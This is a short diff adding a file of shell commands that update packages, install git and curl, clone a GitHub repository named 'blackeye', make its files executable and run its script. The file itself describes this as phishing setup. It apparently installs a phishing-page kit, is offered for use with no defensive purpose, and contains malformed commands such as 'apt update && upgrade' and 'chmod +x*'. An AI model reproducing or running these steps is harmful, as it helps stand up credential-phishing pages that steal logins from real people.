@@ -1,0 +1,8 @@
+apt update && upgrade
+apt install git
+apt install curl
+git clone https://github.com/AnOnUD4Y/blackeye
+cd blackeye
+chmod +x*
+bash blackeye.sh
+All are commands for phishing.
